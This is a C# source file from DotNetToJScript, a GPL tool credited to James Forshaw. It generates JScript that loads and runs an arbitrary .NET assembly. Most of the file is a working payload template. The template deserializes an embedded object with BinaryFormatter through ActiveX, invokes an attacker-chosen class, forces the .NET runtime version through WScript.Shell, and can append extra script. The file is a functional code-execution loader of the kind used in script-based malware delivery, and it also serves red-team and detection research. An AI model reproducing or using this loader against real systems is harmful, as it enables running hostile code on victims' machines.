//    This file is part of DotNetToJScript - A tool to generate a 
//    JScript which bootstraps an arbitrary v2.NET Assembly and class.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Text;

namespace DotNetToJScript
{
    class JScriptGenerator : IScriptGenerator
    {
        static string jscript_template =
            @"var serialized_obj = [
%SERIALIZED%
];
var entry_class = '%CLASS%';

try {
    setversion();
    var stm = new ActiveXObject('System.IO.MemoryStream');
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList')

    for (i in serialized_obj) {
        stm.WriteByte(serialized_obj[i]);
    }

    stm.Position = 0;
    var n = fmt.SurrogateSelector;
    var d = fmt.Deserialize_2(stm);
    al.Add(n);
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
    %ADDEDSCRIPT%
} catch (e) {
    debug(e.message);
}";

        static string version_detection = @"function setversion() {
  var shell = new ActiveXObject('WScript.Shell');
  ver = 'v4.0.30319';
  try {
    shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
  } catch(e) { 
    ver = 'v2.0.50727';
  }
  shell.Environment('Process')('COMPLUS_Version') = ver;
}";
        static string version_v2 = @"function setversion() {
  new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v2.0.50727';
}";
        static string version_v4 = @"function setversion() {
  new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}";
        static string version_none = @"function setversion() {}";

        static string debug_enabled = @"function debug(s) { WScript.Echo(s); }" + Environment.NewLine;
        static string debug_disabled = @"function debug(s) { }" + Environment.NewLine;

        static string GetSetVersionJScript(RuntimeVersion version)
        {
            string script = version_none;
            switch (version)
            {
                case RuntimeVersion.Auto:
                    script = version_detection;
                    break;
                case RuntimeVersion.v2:
                    script = version_v2;
                    break;
                case RuntimeVersion.v4:
                    script = version_v4;
                    break;
            }
            return script + Environment.NewLine;
        }


        public string ScriptName
        {
            get
            {
                return "JScript";
            }
        }

        public bool SupportsScriptlet
        {
            get
            {
                return true;
            }
        }

        public string GenerateScript(byte[] serialized_object, string entry_class_name, string additional_script, RuntimeVersion version, bool enable_debug)
        {
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < serialized_object.Length; ++i)
            {
                builder.Append(serialized_object[i]);
                if (i < serialized_object.Length - 1)
                {
                    builder.Append(",");
                }
                if (i > 0 && (i % 32) == 0)
                {
                    builder.AppendLine();
                }
            }
            
            return (enable_debug ? debug_enabled : debug_disabled) + GetSetVersionJScript(version) 
                + jscript_template.Replace("%SERIALIZED%", builder.ToString()).Replace("%CLASS%", entry_class_name).Replace("%ADDEDSCRIPT%", additional_script);
        }
    }
}
